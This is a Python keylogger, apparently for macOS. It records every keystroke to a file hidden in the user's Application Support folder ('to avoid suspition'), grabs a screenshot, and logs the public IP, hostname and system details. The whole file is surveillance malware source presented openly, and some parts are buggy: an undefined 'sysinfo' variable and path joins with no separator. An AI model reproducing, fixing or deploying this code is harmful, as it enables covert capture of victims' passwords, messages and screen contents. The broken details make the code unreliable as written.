from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import socket
import time
from requests import get
import platform
from pathlib import Path

home = str(Path.home())
filepath = home + '/Library/Application Support/Your App name' #Keeping the files here to avoid suspition
keylog = 'keylogger.txt'
scrshot = 'screenshot.png'
count = 0
keys = []
ttime = time.time()
systeminfo = 'systeminfo.txt'
currenttime = str(ttime)

def on_press(key) :
    global keys, count
    print(key)
    count = count + 1
    keys.append(key)
    if count >= 1 :
        count = 0
        writefile(keys)
        keys = []

def on_release(key) :
    if key == Key.esc :
        with open(filepath + keylog, "a") as f :
             f.write('\n')
             f.write(currenttime)
        return False

def writefile(keys):
    with open(filepath + keylog, "a") as f :
        for key in keys:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.backspace:
                f.write('[BACKSPACE]')
            elif key == Key.shift:
                f.write('[SHIFT]')
            elif key == Key.ctrl:
                f.write('[CTRL]')
            elif key == Key.alt:
                f.write('[OPTION]')
            elif key == Key.cmd:
                f.write('[COMMAND]')
            elif key == Key.tab:
                f.write('[TAB]')
            elif key == Key.esc:
                f.write('[ESC]')
            else:
                f.write(str(key).replace("'", ""))

def computerinfo():
    with open(filepath + sysinfo, 'a') as f1:
        hostname=socket.gethostname()
        IPAddress=socket.gethostbyname(hostname)

        try:
            public_IP = get("https://api.ipify.org").text
            f1.write("Public IP Address: " + public_IP)

        except Exception:
            f1.write("Couldn't get Public IP Address")

        f1.write("Processor: " + platform.processor() + '\n')
        f1.write("System: " + platform.system() + " " + platform.version() + '\n')
        f1.write("Machine: " + platform.machine() + '\n')
        f1.write("Hostname: " + hostname + '\n')
        f1.write("Private IP Address: " + IPAddress + '\n')


def screenshot() :
    image = ImageGrab.grab()
    image.save(filepath + scrshot)

with Listener(on_press = on_press, on_release = on_release) as listener :
    listener.join()
screenshot()
computerinfo()

